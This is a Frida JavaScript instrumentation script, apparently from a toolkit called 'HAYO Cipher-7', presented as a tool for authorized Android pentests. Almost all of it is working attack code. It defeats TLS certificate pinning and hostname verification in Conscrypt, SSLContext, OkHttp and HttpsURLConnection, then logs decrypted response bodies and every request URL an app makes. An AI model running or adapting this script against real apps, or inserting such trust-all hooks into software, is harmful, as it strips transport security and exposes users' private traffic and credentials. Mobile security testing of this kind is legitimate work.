/*
 * HAYO Cipher-7 — UNIVERSAL Deep Cloud Interception (payload_universal.js)
 * =======================================================================
 * Broad-spectrum capture for authorized pentests: bypasses EVERY common SSL
 * pinning method and captures response bodies from OkHttp3/Retrofit + logs all
 * request URLs (OkHttp + HttpURLConnection). Use when the minimal OkHttp-only
 * payload stays silent because the target uses a different network stack.
 *
 * Every hook is wrapped so a missing class NEVER crashes the app.
 */
Java.perform(function () {
    console.log("[*] HAYO Cipher-7: UNIVERSAL interception engaged — unpinning + capturing all clients...");

    // ── 1) SSL PINNING BYPASS (multiple methods) ──────────────────────────
    // 1a. Conscrypt TrustManagerImpl.verifyChain (Android 7+ default)
    try {
        var TMImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TMImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            return untrustedChain;
        };
        console.log("[+] Hooked Conscrypt TrustManagerImpl.verifyChain");
    } catch (e) {}

    // 1b. SSLContext.init → force an all-trusting TrustManager
    try {
        var X509TM = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustAll = Java.registerClass({
            name: 'com.hayo.TrustAll',
            implements: [X509TM],
            methods: {
                checkClientTrusted: function (chain, authType) {},
                checkServerTrusted: function (chain, authType) {},
                getAcceptedIssuers: function () { return []; }
            }
        });
        var tms = [TrustAll.$new()];
        var init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
        init.implementation = function (km, tm, sr) { init.call(this, km, tms, sr); };
        console.log("[+] Hooked SSLContext.init (all-trusting)");
    } catch (e) {}

    // 1c. OkHttp3 CertificatePinner.check (all overloads)
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        var overloads = CP.check.overloads;
        for (var i = 0; i < overloads.length; i++) {
            overloads[i].implementation = function () { return; };
        }
        console.log("[+] Hooked okhttp3.CertificatePinner.check");
    } catch (e) {}

    // 1d. HostnameVerifier ALLOW-ALL
    try {
        var HNV = Java.use('javax.net.ssl.HttpsURLConnection');
        HNV.setDefaultHostnameVerifier.implementation = function (v) {};
    } catch (e) {}

    // ── 2) OkHttp3 RESPONSE BODY CAPTURE (the money shot) ─────────────────
    try {
        var Response = Java.use("okhttp3.Response");
        var Charset = Java.use("java.nio.charset.Charset");
        Response.body.overload().implementation = function () {
            var body = this.body();
            if (body != null) {
                try {
                    var source = body.source();
                    source.request(9223372036854775807);
                    var buffer = source.buffer();
                    var responseBodyString = buffer.clone().readString(Charset.forName("UTF-8"));
                    console.log("\n==============================================");
                    console.log("🔴 [CLOUD DATA EXTRACTED] 🔴");
                    console.log("URL: " + this.request().url().toString());
                    console.log("DATA: \n" + responseBodyString);
                    console.log("==============================================\n");
                } catch (err) {}
            }
            return this.body();
        };
        console.log("[+] Hooked okhttp3.Response.body (response capture)");
    } catch (e) {}

    // ── 3) OkHttp3 REQUEST URL logging (see every endpoint hit) ───────────
    try {
        var RealCall = Java.use("okhttp3.internal.connection.RealCall");
        RealCall.execute.implementation = function () {
            try { console.log("[REQ] " + this.request().url().toString()); } catch (e) {}
            return this.execute();
        };
    } catch (e) {}

    // ── 4) HttpURLConnection URL logging (non-OkHttp apps) ────────────────
    try {
        var URL = Java.use("java.net.URL");
        URL.openConnection.overload().implementation = function () {
            try { console.log("[URL] " + this.toString()); } catch (e) {}
            return this.openConnection();
        };
    } catch (e) {}

    console.log("[*] All hooks installed. Navigate the app to trigger cloud traffic.");
});
